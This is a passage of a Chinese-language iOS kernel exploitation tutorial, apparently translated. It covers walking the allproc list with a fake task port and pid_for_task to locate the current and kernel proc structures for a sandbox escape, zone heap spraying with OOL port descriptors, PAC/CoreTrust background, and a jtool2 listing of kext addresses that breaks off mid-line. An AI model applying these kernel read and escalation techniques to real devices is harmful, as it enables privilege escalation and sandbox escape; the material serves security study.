function_">proc_klist_lock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_klist_unlock</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock_spin</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdunlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_fdlock_assert</span><span class="params">(<span class="type">proc_t</span> p, <span class="type">int</span> assertflags)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_ucred_lock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">proc_ucred_unlock</span><span class="params">(<span class="keyword">struct</span> proc *)</span>;</span><br></pre></td></tr></table></figure>

<p>然后，可以再次使用pid_for_task()来遍历这些结构体，通过检查pid&#x3D;getpid()找到当前proc结构体(这样我们以后可以更改当前proc的cred以逃逸沙盒)，并通过检查pid&#x3D;0来找到内核proc结构体(这样我们就可以获得内核proc的cred，找到kernel task，ipc_space_kernel等)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// extern struct proclist allproc;</span></span><br><span class="line"><span class="comment">// This global variable stores the start of the linked_list of all proc objects</span></span><br><span class="line"><span class="type">uint64_t</span> allproc = allproc_offset + kernel_base;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> proc_ = allproc;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> myproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> kernproc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0</span></span><br><span class="line"><span class="keyword">while</span> (proc_) &#123;</span><br><span class="line">    <span class="type">uint64_t</span> proc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getting the address of the next proc object in the linked list</span></span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = proc_ - <span class="number">0x10</span>;</span><br><span class="line">    pid_for_task(foundport, (<span class="type">int32_t</span>*)&amp;proc);</span><br><span class="line">    <span class="comment">// Need to read 2 times cause &quot;pid_for_task&quot; can only read 4 bytes at a time</span></span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = <span class="number">4</span> + proc_ - <span class="number">0x10</span>;</span><br><span class="line">    pid_for_task(foundport, (<span class="type">int32_t</span>*)(((<span class="type">uint64_t</span>)(&amp;proc)) + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getting the PID of from proc-&gt;p_pid</span></span><br><span class="line">    <span class="type">int</span> pd = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*) (faketask + procoff) = proc;</span><br><span class="line">    pid_for_task(foundport, &amp;pd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Checking if it equals my PID</span></span><br><span class="line">    <span class="keyword">if</span> (pd == getpid()) &#123;</span><br><span class="line">        <span class="comment">// Address of my proc struct</span></span><br><span class="line">        myproc = proc;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pd == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// Address of the kernel proc struct</span></span><br><span class="line">        kernproc = proc;</span><br><span class="line">    &#125;</span><br><span class="line">    proc_ = proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="堆分配基础"><a href="#堆分配基础" class="headerlink" title="堆分配基础"></a>堆分配基础</h3><p>在iOS中，堆内存分为多个zone。相同大小的分配使用相同的zone，除非某些对象具有自己的特殊zone(ports，vouchers等)。这些zone随着分配对象增多而增长，并且从zone map中获得新页。在macOS上，可以使用zprint命令看到分配的zone。许多堆分配技术在iOS中仍然相同。另一件事是要注意，iOS也具有zone垃圾回收。</p>
<p><img src="https://highaltitudehacks.com/images/30.png" alt="30"></p>
<p>如上所述，某些对象具有自己的特殊zone。zone是固定大小的数据块的集合，可以对其进行快速分配和释放。例如，在下图中，我们可以看到很多IPC对象，包括ports，vouchers等都有自己的zone。因此如果释放一个voucher那么将无法使用另一种对象占用释放的内存，除非触发zone垃圾回收并将包含该地址的页移动到其它位置，然后再分配另一种对象。</p>
<p><img src="https://highaltitudehacks.com/images/31.png" alt="31"></p>
<p>在最近的几个iOS版本中对堆采取了很多加固措施。</p>
<blockquote>
<p>建议阅读这个Stefan Esser关于iOS内核堆的[PPT](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)，也可以阅读内核源代码，从osfmk&#x2F;kern&#x2F;zalloc.c开始，其中有一些堆分配的注释。</p>
</blockquote>
<p><img src="https://highaltitudehacks.com/images/38.png" alt="38"></p>
<p>最近用于heap spray的常用技术之一是通过发送带有选项<code>MACH_MSG_OOL_PORTS_DESCRIPTOR</code>的Mach消息，以端口指针数组填充内存。这将调用<code>ipc/ipc_kmsg.c</code>中的<code>ipc_kmsg_copyin_ool_ports_descriptor</code>，它会调用kalloc(ports_length)将端口指针填充到堆中。</p>
<p>在voucher_swap EXP中可以看到这样做的好处：虽然分配端口会将它们放入ipc.port zone，但是如果是端口指针，就不是这样，因此可以使用端口指针占用释放的对象。用端口其实也可以，因为进行足够的喷射之后能够迫使内核进行垃圾回收并从zone map中分配新页，其中可能包括释放的对象。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_descriptor_t</span> *</span><br><span class="line"><span class="title function_">ipc_kmsg_copyin_ool_ports_descriptor</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">mach_msg_ool_ports_descriptor_t</span> *dsc,</span></span><br><span class="line"><span class="params">    <span class="type">mach_msg_descriptor_t</span> *user_dsc,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> is_64bit,</span></span><br><span class="line"><span class="params">    <span class="type">vm_map_t</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">.....................</span></span><br><span class="line"><span class="params">    dsc-&gt;address = <span class="literal">NULL</span>;  <span class="comment">/* for now */</span></span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    data = kalloc(ports_length);</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span></span><br><span class="line"><span class="params">        *mr = MACH_SEND_NO_BUFFER;</span></span><br><span class="line"><span class="params">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span></span><br><span class="line"><span class="params">    &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="指针验证检查和CoreTrust"><a href="#指针验证检查和CoreTrust" class="headerlink" title="指针验证检查和CoreTrust"></a>指针验证检查和CoreTrust</h3><p>ARM 8.3指令集添加了一个称为PAC(Pointer Authentication Check，指针验证检查)的新功能，目的是检查指针的完整性。它将加密签名附加到指针值里未使用的位中，然后在使用指针之前验证这些签名。由于攻击者没有用于为这些指针创建签名的密钥，因此无法创建有效的指针。<br>另一方面，CoreTrust是一个单独的内核扩展(com.apple.kext.CoreTrust)，它不允许自签名二进制文件(jtool2 -sign)在设备上运行。以前，Apple Mobile File Integrity Kext(AMFI.kext)与用户态amfid守护程序一起检查代码签名。可以通过将代码签名哈希注入AMFI trust cache，hook amfid异常端口并允许代码继续执行等多种方式来绕过。CoreTrust施加了一些其他检查，这些检查仅允许Apple签名的二进制文件在设备上运行。</p>
<h2 id="KernelCache"><a href="#KernelCache" class="headerlink" title="KernelCache"></a>KernelCache</h2><p>KernelCache是一个包含核心内核及其内核拓展的Mach-O二进制文件，iOS10之前是加密的，现在可以通过IPSW文件解压得到，或者通过内核漏洞dump出来。</p>
<h3 id="提取kext文件"><a href="#提取kext文件" class="headerlink" title="提取kext文件"></a>提取kext文件</h3><p>通过jtool2获取kext的地址信息，再在IDA中进行分析。或者也可以将kernelcache解码后，放在Ghidra中进行分析。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">$ ~/Downloads/jtool2/jtool2 -k kernelcache.release.n66</span><br><span class="line">0xfffffff005c5c000:com.apple.kpi.mach</span><br><span class="line">0xfffffff005c5c080:com.apple.kpi.private</span><br><span class="line">0xfffffff005c5c100:com.apple.kpi.unsupported</span><br><span class="line">0xfffffff005c5c180:com.apple.kpi.iokit</span><br><span class="line">0xfffffff005c5c200:com.apple.kpi.libkern</span><br><span class="line">0xfffffff005c5c280:com.apple.kpi.bsd</span><br><span class="line">0xfffffff005c5c300:com.apple.iokit.IONetworkingFamily</span><br><span class="line">0xfffffff005c5de00:com.apple.iokit.IOTimeSyncFamily</span><br><span class="line">0xfffffff005c616c0:com.apple.driver.corecapture</span><br><span class="line">0xfffffff005c64bc0:com.apple.kec.corecrypto</span><br><span class="line">0xfffffff005c7cf00:com.apple.driver.IOImageLoader</span><br><span class="line">0xfffffff005c7f080:com.apple.driver.AppleBCMWLANFirmware.Hashstore</span><br><span class="line">0xfffffff005c8de00:com.apple.iokit.IOSlowAdaptiveClockingFamily</span><br><span class="line">0xfffffff005c8e380:com.apple.iokit.IOStorageFamily</span><br><span class="line">0xfffffff005c8f5c0:com.apple.iokit.IOReportFamily</span><br><span class="line">0xfffffff005c8fdc0:com.apple.driver.AppleARMPlatform</span><br><span class="line">0xfffffff005c99600:com.apple.driver.AppleSamsungSPI</span><br><span class="line">0xfffffff005c9a580:com.apple.kpi.dsep</span><br><span class="line">0xfffffff005c9a600:com.apple.kext.CoreTrust</span><br><span class="line">0xfffffff005c9b3c0:com.apple.driver.AppleMobileFileIntegrity</span><br><span class="line">0xfffffff005cc23c0:com.apple.iokit.IOHIDFamily</span><br><span class="line">0xfffffff005cc3f40:com.apple.driver.AppleEmbeddedLightSensor</span><br><span class="line">0xfffffff005cc7980:com.apple.driver.AppleS5L8920XPWM</span><br><span class="line">0xfffffff005cc7f00:com.apple.driver.AppleEmbeddedTempSensor</span><br><span class="line">0xfffffff005ccb7c0:com.apple.driver.usb.AppleUSBCommon</span><br><span class="line">0xfffffff005ccc200:com.apple.driver.AppleUSBHostMergeProperties</span><br><span class="line">0xfffffff005ccc7c0:com.apple.iokit.IOUSBDeviceFamily</span><br><span class="line">0xfffffff005cd0d40:com.apple.iokit.IOSerialFamily</span><br><span class="line">0xfffffff005cd1680:com.apple.iokit.IOSkywalkFamily</span><br><span class="line">0xfffffff005cd2f80:com.apple.driver.AppleOnboardSerial</span><br><span class="line">0xfffffff005cd4e40:com.apple.iokit.IOAccessoryManager</span><br><span class="line">0xfffffff005cda180:com.apple.driver.AppleARMPMU</span><br><span class="line">0xfffffff005cdcfc0:com.apple.driver.AppleSN2400Charger</span><br><span class="line">0xfffffff005cddf80:com.apple.iokit.IOSurface</span><br><span class="line">0xfffffff005ce3b00:com.apple.driver.IODARTFamily</span><br><span class="line">0xfffffff005ce5cc0:com.apple.driver.AppleM2ScalerCSCDriver</span><br><span class="line">0xfffffff005d14e80:com.apple.iokit.IOHDCPFamily</span><br><span class="line">0xfffffff005d1a100:com.apple.kec.Libm</span><br><span class="line">0xfffffff005d205c0:com.apple.iokit.IOAudio2Family</span><br><span class="line">0xfffffff005d20e40:com.apple.iokit.IOCECFamily</span><br><span class="line">0xfffffff005d217c0:com.apple.iokit.IOAVFamily</span><br><span class="line">0xfffffff005d38280:com.apple.AUC</span><br><span class="line">0xfffffff005d39900:com.apple.iokit.IOMobileGraphicsFamily</span><br><span class="line">0xfffffff005d400c0:com.apple.driver.AppleH8ADBE0</span><br><span class="line">0xfffffff005d51dc0:com.apple.driver.AppleAVEH8</span><br><span class="line">0xfffffff005dcf640:com.apple.driver.AppleFirmwareUpdateKext</span><br><span class="line">0xfffffff005dd2400:com.apple.driver.ApplePMGR</span><br><span class="line">0xfffffff005de4740:com.apple.driver.AppleS8000PMGR</span><br><span class="line">0xfffffff005de6380:com.apple.driver.AppleIPAppender</span><br><span class="line">0xfffffff005de6ec0:com.apple.driver.AppleMultitouchSPI</span><br><span class="line">0xfffffff005deb580:com.apple.iokit.IOPCIFamily</span><br><span class="line">0xfffffff005ded9c0:com.apple.driver.AppleEmbeddedPCIE</span><br><span class="line">0xfffffff005df3e80:com.apple.driver.AppleS800xPCIe</span><br><span class="line">0xfffffff005df6500:com.apple.driver.AppleS8000PCIe</span><br><span class="line">0xfffffff005df7280:com.apple.driver.AppleBiometricSensor</span><br><span class="line">0xfffffff005dfd8c0:com.apple.driver.ProvInfoIOKit</span><br><span class="line">0xfffffff005e01b40:com.apple.iokit.IOUSBHostFamily</span><br><span class="line">0xfffffff005e12800:com.apple.driver.usb.AppleUSBHostPacketFilter</span><br><span class="line">0xfffffff005e130c0:com.apple.driver.AppleS5L8960XDART</span><br><span class="line">0xfffffff005e14840:com.apple.driver.DiskImages</span><br><span class="line">0xfffffff005e15600:com.apple.driver.DiskImages.KernelBacked</span><br><span class="line">0xfffffff005e15dc0:com.apple.driver.DiskImages.RAMBackingStore</span><br><span class="line">0xfffffff005e16380:com.apple.driver.AppleJPEGDriver</span><br><span class="line">0xfffffff005e1bec0:com.apple.iokit.AppleARMIISAudio</span><br><span class="line">0xfffffff005e1ce40:com.apple.driver.AppleEmbeddedAudio</span><br><span class="line">0xfffffff005e239c0:com.apple.driver.AppleCSEmbeddedAudio</span><br><span class="line">0xfffffff005e24600:com.apple.iokit.IOMikeyBusFamily</span><br><span class="line">0xfffffff005e26780:com.apple.driver.AppleTriStar</span><br><span class="line">0xfffffff005e28d40:com.apple.driver.AppleEmbeddedMikeyBus</span><br><span class="line">0xfffffff005e2ae40:com.apple.driver.AppleMikeyBusAudio</span><br><span class="line">0xfffffff005e2e180:com.apple.driver.AppleHIDKeyboardEmbedded</span><br><span class="line">0xfffffff005e2e180:com.apple.driver.AppleS5L8940XI2C</span><br><span class="line">0xfffffff005e2ec80:com.apple.driver.AppleEmbeddedUSB</span><br><span class="line">0xfffffff005e30440:com.apple.iokit.IOCryptoAcceleratorFamily</span><br><span class="line">0xfffffff005e31300:com.apple.iokit.EncryptedBlockStorage</span><br><span class="line">0xfffffff005e31ac0:com.apple.driver.AppleEffaceableStorage</span><br><span class="line">0xfffffff005e33580:com.apple.driver.LightweightVolumeManager</span><br><span class="line">0xfffffff005e36040:com.apple.driver.usb.networking</span><br><span class="line">0xfffffff005e36680:com.apple.driver.usb.AppleUSBHostCompositeDevice</span><br><span class="line">0xfffffff005e37240:com.apple.driver.usb.cdc</span><br><span class="line">0xfffffff005e37900:com.apple.driver.usb.cdc.ncm</span><br><span class="line">0xfffffff005e38900:com.apple.driver.AppleUSBEthernetDevice</span><br><span class="line">0xfffffff005e39a80:com.apple.iokit.IO80211Family</span><br><span class="line">0xfffffff005e61ac0:com.apple.plugin.IOgPTPPlugin</span><br><span class="line">0xfffffff005e76f00:com.apple.driver.LSKDIOKit</span><br><span class="line">0xfffffff005e95200:com.apple.driver.FairPlayIOKit</span><br><span class="line">0xfffffff005eabe40:com.apple.driver.LSKDIOKitMSE</span><br><span class="line">0xfffffff005ec0cc0:com.apple.driver.AppleD5500</span><br><span class="line">0xfffffff005eea380:com.apple.driver.IOSlaveProcessor</span><br><span class="line">0xfffffff005eea900:com.apple.driver.AppleA7IOP</span><br><span class="line">0xfffffff005eeed80:com.apple.driver.RTBuddy</span><br><span class="line">0xfffffff005efb840:com.apple.driver.AppleSMC</span><br><span class="line">0xfffffff005f01900:com.apple.driver.AppleSEPManager</span><br><span class="line">0xfffffff005f1aa80:com.apple.driver.AppleSSE</span><br><span class="line">0xfffffff005f1ba80:com.apple.driver.ASIOKit</span><br><span class="line">0xfffffff005f1d0c0:com.apple.driver.AppleS8000DWI</span><br><span class="line">0xfffffff005f1d880:com.apple.driver.AppleCS35L19Amp</span><br><span class="line">0xfffffff005f1e200:com.apple.driver.usb.IOUSBHostHIDDevice</span><br><span class="line">0xfffffff005f1fd80:com.apple.driver.AppleUSBDeviceAudioController</span><br><span class="line">0xfffffff005f20580:com.apple.driver.AppleUSBAudio</span><br><span class="line">0xfffffff005f22e40:com.apple.driver.DiskImages.UDIFDiskImage</span><br><span class="line">0xfffffff005f24080:com.apple.driver.AppleLMBacklight</span><br><span class="line">0xfffffff005f249c0:com.apple.iokit.IOUserEthernet</span><br><span class="line">0xfffffff005f25300:com.apple.iokit.IOSCSIArchitectureModelFamily</span><br><span class="line">0xfffffff005f26940:com.apple.iokit.IOSCSIBlockCommandsDevice</span><br><span class="line">0xfffffff005f27240:com.apple.iokit.IOUSBMassStorageDriver</span><br><span class="line">0xfffffff005f29bc0:com.apple.driver.AppleUSBCardReader</span><br><span class="line">0xfffffff005f2aec0:com.apple.driver.AppleS8000SOCTuner</span><br><span class="line">0xfffffff005f2bb00:com.apple.driver.AppleSynopsysMIPIDSI</span><br><span class="line">0xfffffff005f2f580:com.apple.nke.ppp</span><br><span class="line">0xfffffff005f31980:com.apple.nke.l2tp</span><br><span class="line">0xfffffff005f33880:com.apple.driver.AppleSynopsysOTGDevice</span><br><span class="line">0xfffffff005f36100:com.apple.driver.AppleSPU</span><br><span class="line">0xfffffff005f39780:com.apple.AGXFirmwareKextG5P</span><br><span class="line">0xfffffff005f57740:com.apple.driver.AppleS8000PMPFirmware</span><br><span class="line">0xfffffff005f58300:com.apple.driver.AppleTwisterErrorHandler</span><br><span class="line">0xfffffff005f59240:com.apple.driver.AppleS8000</span><br><span class="line">0xfffffff005f5d840:com.apple.IOTextEncryptionFamily</span><br><span class="line">0xfffffff005f5e180:com.apple.driver.usb.AppleUSBHub</span><br><span class="line">0xfffffff005f63440:com.apple.driver.AppleH6CameraInterface</span><br><span class="line">0xfffffff005f6a380:com.apple.driver.AppleMobileApNonce</span><br><span class="line">0xfffffff005f6b280:com.apple.driver.AppleUSBMike</span><br><span class="line">0xfffffff005f6d100:com.apple.driver.AppleMultitouchSPIN66</span><br><span class="line">0xfffffff005f6d100:com.apple.driver.AppleS8000CLPC</span><br><span class="line">0xfffffff005f72e40:com.apple.driver.AppleSEPKeyStore</span><br><span class="line">0xfffffff005f75240:com.apple.audio.IOBorealisOwl</span><br><span class="line">0xfffffff005f7f880:com.apple.driver.DiskImages.FileBackingStore</span><br><span class="line">0xfffffff005f7ffc0:com.apple.driver.ApplePMP</span><br><span class="line">0xfffffff005f82dc0:com.apple.iokit.IOStreamFamily</span><br><span class="line">0xfffffff005f83580:com.apple.driver.AppleS5L8960XNCO</span><br><span class="line">0xfffffff005f83b00:com.apple.driver.AppleChestnutDisplayPMU</span><br><span class="line">0xfffffff005f84340:com.apple.kec.pthread</span><br><span class="line">0xfffffff005f86640:com.apple.driver.AppleStockholmControl</span><br><span class="line">0xfffffff005f87040:com.apple.driver.AppleSamsungSerial</span><br><span class="line">0xfffffff005f87700:com.apple.driver.AppleBSDKextStarter</span><br><span class="line">0xfffffff005f87cc0:com.apple.driver.usb.cdc.ecm</span><br><span class="line">0xfffffff005f88440:com.apple.driver.AppleBasebandN71</span><br><span class="line">0xfffffff005f8a200:com.apple.filesystems.apfs</span><br><span class="line">0xfffffff005fb0e80:com.apple.kext.AppleMatch</span><br><span class="line">0xfffffff005fb1200:com.apple.driver.AppleEffaceableBlockDevice</span><br><span class="line">0xfffffff005fb19c0:com.apple.driver.AppleS8000AES</span><br><span class="line">0xfffffff005fb3b00:com.apple.driver.AppleMesaSEPDriver</span><br><span class="line">0xfffffff005fba440:com.apple.driver.AppleBluetooth</span><br><span class="line">0xfffffff005fbabc0:com.apple.driver.usb.ethernet.asix</span><br><span class="line">0xfffffff005fbc200:com.apple.driver.AppleBasebandPCI</span><br><span class="line">0xfffffff005fc2a00:com.apple.driver.AppleSEPCredentialManager</span><br><span class="line">0xfffffff005fc7140:com.apple.driver.AppleS8003PCIe</span><br><span class="line">0xfffffff005fc7f00:com.apple.driver.AppleSamsungPKE</span><br><span class="line">0xfffffff005fc84c0:com.apple.driver.AppleInterruptController</span><br><span class="line">0xfffffff005fc9380:com.apple.driver.AppleC26Charger</span><br><span class="line">0xfffffff005fca7c0:com.apple.driver.AppleAuthCP</span><br><span class="line">0xfffffff005fcc440:com.apple.driver.AppleSPUSphere</span><br><span class="line">0xfffffff005fccb80:com.apple.driver.AppleS5L8960XGPIOIC</span><br><span class="line">0xfffffff005fcd9c0:com.apple.security.sandbox</span><br><span class="line">0xfffffff0060520c0:com.apple.driver.AppleHIDKeyboard</span><br><span class="line">0xfffffff006053200:com.apple.driver.AppleHDQGasGaugeControl</span><br><span class="line">0xfffffff006055e00:com.apple.driver.AppleTemperatureSensor</span><br><span class="line">0xfffffff006056b40:com.apple.driver.AppleAE2Audio</span><br><span class="line">0xfffffff006057e00:com.apple.driver.AppleNANDConfigAccess</span><br><span class="line">0xfffffff006058340:com.apple.iokit.IONVMeFamily</span><br><span class="line">0xfffffff006065000:com.apple.driver.AppleDialogPMU</span><br><span class="line">0xfffffff0060658c0:com.apple.driver.AppleD2255PMU</span><br><span class="line">0xfffffff006067540:com.apple.iokit.IOHIDEventDriver</span><br><span class="line">0xfffffff006067540:com.apple.driver.USBStorageDeviceSpecifics</span><br><span class="line">0xfffffff006067540:com.apple.driver.usb.AppleUSBEHCI</span><br><span class="line">0xfffffff006070cc0:com.apple.driver.AppleUSBHSIC</span><br><span class="line">0xfffffff006072d40:com.apple.driver.usb.AppleUSBOHCI</span><br><span class="line">0xfffffff006075b80:com.apple.driver.AppleEmbeddedUSBHost</span><br><span class="line">0xfffffff006076b00:com.apple.driver.usb.AppleUSBHostT7000</span><br><span class="line">0xfffffff006078600:com.apple.driver.IOAudioCodecs</span><br><span class="line">0xfffffff00607b4c0:com.apple.driver.DiskImages.ReadWriteDiskImage</span><br><span class="line">0xfffffff00607ba00:com.apple.AppleFSCompression.AppleFSCompressionTypeZlib</span><br><span class="line">0xfffffff00607d180:com.apple.driver.AppleBluetoothDebugService</span><br><span class="line">0xfffffff00607d6c0:com.apple.driver.AppleBCMWLANCore</span><br><span class="line">0xfffffff0060b97c0:com.apple.driver.AppleBCMWLANBusInterfacePCIe</span><br><span class="line">0xfffffff0060c9180:com.apple.driver.AppleUSBDeviceNCM</span><br><span class="line">0xfffffff0060c9d80:com.apple.security.AppleImage4</span><br><span class="line">0xfffffff0060cce80:com.apple.driver.AppleBSDKextStarterVPN</span><br><span class="line">0xfffffff0060cce80:com.apple.driver.AppleCS42L71Audio</span><br><span class="line">0xfffffff0060cfb00:com.apple.filesystems.hfs.kext</span><br><span class="line">0xfffffff0060e33c0:com.apple.driver.AppleS8000SmartIO</span><br><span class="line">0xfffffff0060ec940:com.apple.driver.AppleM68Buttons</span><br><span class="line">0xfffffff0060edec0:com.apple.driver.usb.IOUSBHostHIDDeviceSafeBoot</span><br><span class="line">0xfffffff0060edec0:com.apple.driver.AppleUSBDeviceMux</span><br><span class="line">0xfffffff0060ef740:com.apple.nke.pptp</span><br><span class="line">0xfffffff0060f0ac0:com.apple.driver.AppleBasebandPCIMAVControl</span><br><span class="line">0xfffffff0060f58c0:com.apple.driver.AppleS5L8960XWatchDogTimer</span><br><span class="line">0xfffffff0060f6440:com.apple.driver.AppleStorageDrivers</span><br><span class="line">0xfffffff0060f6440:com.apple.driver.ApplePinotLCD</span><br><span class="line">0xfffffff0060f6ac0:com.apple.iokit.IOAcceleratorFamily</span><br><span class="line">0xfffffff0060fc080:com.apple.iokit.usb.AppleUSBHostUserClient</span><br><span class="line">0xfffffff0060fc080:com.apple.driver.AppleUSBEthernetHost</span><br><span class="line">0xfffffff0060fd200:com.apple.driver.AppleIDAMInterface</span><br><span class="line">0xfffffff0060fdd80:com.apple.iokit.IOHIDEventDriverSafeBoot</span><br><span 